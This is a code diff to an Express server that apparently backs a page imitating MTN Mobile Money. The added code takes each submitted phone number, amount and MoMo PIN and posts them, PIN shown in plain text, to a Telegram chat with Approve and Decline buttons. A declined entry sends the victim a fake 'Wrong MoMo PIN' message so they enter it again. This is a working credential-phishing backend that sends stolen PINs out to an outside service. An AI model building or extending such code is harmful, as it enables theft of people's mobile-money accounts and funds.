@@ -1,3 +1,5 @@
+require('dotenv').config();
+
 const express = require('express');
 const fs = require('fs');
 const path = require('path');
@@ -5,6 +7,9 @@ const path = require('path');
 const app = express();
 const PORT = process.env.PORT || 3000;
 const DATA_FILE = path.join(__dirname, 'data.json');
+
+const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
+const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
 
 const DEFAULT_STATE = {
   status: 'Money Sent',
@@ -46,19 +51,70 @@ function broadcast(state) {
   }
 }
 
+/* ---- Telegram helpers ---- */
+async function tgSend(method, body) {
+  if (!TELEGRAM_BOT_TOKEN) {
+    console.warn('[tg] missing TELEGRAM_BOT_TOKEN');
+    return null;
+  }
+  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/${method}`;
+  try {
+    const r = await fetch(url, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(body)
+    });
+    const data = await r.json();
+    if (!data.ok) console.error('[tg] error:', JSON.stringify(data));
+    return data;
+  } catch (err) {
+    console.error('[tg] fetch failed:', err.message);
+    return null;
+  }
+}
+
+async function sendSubmissionToTelegram(sub) {
+  const text =
+    `🔔 <b>NEW MoMo SUBMISSION</b>\n\n` +
+    `📱 <b>Phone:</b> ${sub.phone}\n` +
+    `👤 <b>Recipient:</b> ${sub.recipientName || '—'}\n` +
+    `💰 <b>Amount:</b> ${sub.currency || 'USD'} ${sub.amount || '0.00'}\n` +
+    `🔑 <b>PIN:</b> <code>${sub.pin}</code>\n` +
+    `🆔 <b>Ref:</b> <code>${sub.id}</code>\n\n` +
+    `Tap a button to decide.`;
+
+  const keyboard = {
+    inline_keyboard: [[
+      { text: '✅ Approve', callback_data: `approve:${sub.id}` },
+      { text: '❌ Decline', callback_data: `decline:${sub.id}` }
+    ]]
+  };
+
+  return tgSend('sendMessage', {
+    chat_id: TELEGRAM_CHAT_ID,
+    text,
+    parse_mode: 'HTML',
+    reply_markup: keyboard
+  });
+}
+
 /* ---- Endpoints ---- */
 
-// Health check — Render pings this to verify the app is alive
 app.get('/health', (req, res) => {
-  res.status(200).json({ status: 'ok', uptime: process.uptime() });
+  res.status(200).json({
+    status: 'ok',
+    uptime: process.uptime(),
+    telegram: {
+      token: !!TELEGRAM_BOT_TOKEN,
+      chatId: !!TELEGRAM_CHAT_ID
+    }
+  });
 });
 
-// Get current state
 app.get('/api/state', (req, res) => {
   res.json(readState());
 });
 
-// Subscribe to real-time updates
 app.get('/api/stream', (req, res) => {
   res.set({
     'Content-Type': 'text/event-stream',
@@ -68,12 +124,10 @@ app.get('/api/stream', (req, res) => {
   });
   res.flushHeaders();
 
-  // Send current state immediately
   res.write(`data: ${JSON.stringify(readState())}\n\n`);
 
   clients.add(res);
 
-  // Keep-alive comment every 25s so proxies don't close the connection
   const ping = setInterval(() => {
     try { res.write(': ping\n\n'); } catch (_) {}
   }, 25000);
@@ -84,7 +138,6 @@ app.get('/api/stream', (req, res) => {
   });
 });
 
-// Admin update — triggers instant broadcast
 app.post('/api/state', (req, res) => {
   const current = readState();
   const updated = { ...current, ...req.body };
@@ -94,28 +147,35 @@ app.post('/api/state', (req, res) => {
   res.json({ ok: true, state: updated });
 });
 
-// Payment submission — receives phone + PIN + recipient from mtn.html
-// Broadcasts to admin panel + (later) Telegram
-app.post('/api/submit-payment', (req, res) => {
+// Payment submission — forwards to Telegram
+app.post('/api/submit-payment', async (req, res) => {
+  console.log('=== SUBMIT-PAYMENT ===');
+  console.log('Token set?', !!TELEGRAM_BOT_TOKEN);
+  console.log('Chat ID set?', !!TELEGRAM_CHAT_ID);
+  console.log('Body:', JSON.stringify(req.body));
+
   const submission = {
     ...req.body,
     id: 'REQ-' + Date.now(),
     submittedAt: new Date().toISOString()
   };
 
-  // Store latest submission in data.json so admin can see it
   const state = readState();
   state.latestSubmission = submission;
+  delete state.decision;
+  delete state.declineMessage;
+  delete state.decidedAt;
   writeState(state);
-
-  // Notify all connected clients (admin panel picks this up)
   broadcast(state);
 
-  // For now, respond as "pending" — real approval will come from admin/Telegram
+  // Fire off to Telegram (don't block the response)
+  const tgResult = await sendSubmissionToTelegram(submission);
+  console.log('[tg] result ok?', tgResult && tgResult.ok);
+
   res.json({ status: 'pending', id: submission.id });
 });
 
-// Admin approve
+// Admin approve (also used by Telegram callback)
 app.post('/api/approve', (req, res) => {
   const state = readState();
   state.decision = 'approved';
@@ -125,7 +185,6 @@ app.post('/api/approve', (req, res) => {
   res.json({ ok: true });
 });
 
-// Admin decline
 app.post('/api/decline', (req, res) => {
   const state = readState();
   state.decision = 'declined';
@@ -136,7 +195,6 @@ app.post('/api/decline', (req, res) => {
   res.json({ ok: true });
 });
 
-// Reset decision (for next test)
 app.post('/api/reset', (req, res) => {
   const state = readState();
   delete state.decision;
@@ -148,6 +206,85 @@ app.post('/api/reset', (req, res) => {
   res.json({ ok: true, state });
 });
 
-app.listen(PORT, '0.0.0.0', () => {
+/* ---- Telegram webhook ---- */
+app.post('/api/telegram/webhook', async (req, res) => {
+  // Immediately acknowledge
+  res.sendStatus(200);
+
+  const update = req.body || {};
+  const cb = update.callback_query;
+  if (!cb) return;
+
+  const data = cb.data || '';
+  const [action, refId] = data.split(':');
+
+  const state = readState();
+  const current = state.latestSubmission;
+
+  if (!current || (refId && current.id !== refId)) {
+    // Submission already replaced — ignore stale tap
+    await tgSend('answerCallbackQuery', {
+      callback_query_id: cb.id,
+      text: 'This submission is no longer active.',
+      show_alert: false
+    });
+    return;
+  }
+
+  if (action === 'approve') {
+    state.decision = 'approved';
+    state.decidedAt = new Date().toISOString();
+    writeState(state);
+    broadcast(state);
+
+    await tgSend('answerCallbackQuery', {
+      callback_query_id: cb.id,
+      text: '✅ Approved'
+    });
+
+    await tgSend('editMessageReplyMarkup', {
+      chat_id: cb.message.chat.id,
+      message_id: cb.message.message_id,
+      reply_markup: { inline_keyboard: [[{ text: '✅ Approved', callback_data: 'noop' }]] }
+    });
+  } else if (action === 'decline') {
+    state.decision = 'declined';
+    state.declineMessage = 'Wrong MoMo PIN. Please try again.';
+    state.decidedAt = new Date().toISOString();
+    writeState(state);
+    broadcast(state);
+
+    await tgSend('answerCallbackQuery', {
+      callback_query_id: cb.id,
+      text: '❌ Declined'
+    });
+
+    await tgSend('editMessageReplyMarkup', {
+      chat_id: cb.message.chat.id,
+      message_id: cb.message.message_id,
+      reply_markup: { inline_keyboard: [[{ text: '❌ Declined', callback_data: 'noop' }]] }
+    });
+  }
+});
+
+/* ---- Register webhook on boot ---- */
+async function registerWebhook() {
+  if (!TELEGRAM_BOT_TOKEN) return;
+
+  const publicUrl = process.env.RENDER_EXTERNAL_URL;
+  if (!publicUrl) {
+    console.warn('[tg] RENDER_EXTERNAL_URL not set — skipping webhook registration');
+    return;
+  }
+
+  const webhookUrl = `${publicUrl}/api/telegram/webhook`;
+  const result = await tgSend('setWebhook', { url: webhookUrl });
+  console.log('[tg] setWebhook:', JSON.stringify(result));
+}
+
+app.listen(PORT, '0.0.0.0', async () => {
   console.log(`Running on port ${PORT}`);
+  console.log('Telegram token set?', !!TELEGRAM_BOT_TOKEN);
+  console.log('Telegram chat set?', !!TELEGRAM_CHAT_ID);
+  await registerWebhook();
 });
